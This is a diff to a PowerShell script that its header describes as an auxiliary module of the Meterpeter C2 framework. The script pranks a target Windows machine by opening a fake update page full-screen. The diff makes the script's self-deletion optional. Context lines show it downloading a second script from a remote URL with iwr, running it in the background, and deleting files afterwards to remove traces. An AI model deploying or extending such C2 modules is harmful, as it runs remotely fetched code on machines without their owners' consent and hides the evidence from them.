@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.1
+   PS cmdlet Dev version: v1.0.2
 
 .DESCRIPTION
    Auxiliary module of Meterpeter C2 v2.10.13 that executes a prank in background.
@@ -20,11 +20,18 @@
    sendkeys cmdlet to open default browser in fakeupdate.net in full windows mode.
    sendkeys cmdlet its invoked to send keyboard keys to the browser [Enter + F11]
 
+.Parameter AutoDelete
+   Auto-Delete this cmdlet in the end? (default: off)
+
 .EXAMPLE
    PS C:\> .\FWUprank.ps1
 
 .EXAMPLE
    PS C:\> powershell -file FWUprank.ps1
+
+.EXAMPLE
+   PS C:\> .\FWUprank.ps1 -autodelete 'on'
+   Auto-Delete this cmdlet in the end
 
 .INPUTS
    None. You cannot pipe objects into FWUprank.ps1
@@ -39,6 +46,11 @@
 .LINK
    https://github.com/r00t-3xp10it/meterpeter
 #>
+
+
+[CmdletBinding(PositionalBinding=$false)] param(
+   [string]$AutoDelete="off"  #autodelete cmdlet in the end
+)
 
 
 #Global variable declarations
@@ -112,5 +124,8 @@ iwr -uri "$SendKeyscmdlet" -OutFile "sendkeys.ps1"
 
 #CleanUp
 Remove-Item -Path "sendkeys.ps1" -Force
-#Auto Delete this cmdlet in the end ...
-Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
+If($AutoDelete -iMatch '^(on)$')
+{
+   #Auto Delete this cmdlet in the end ...
+   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
+}
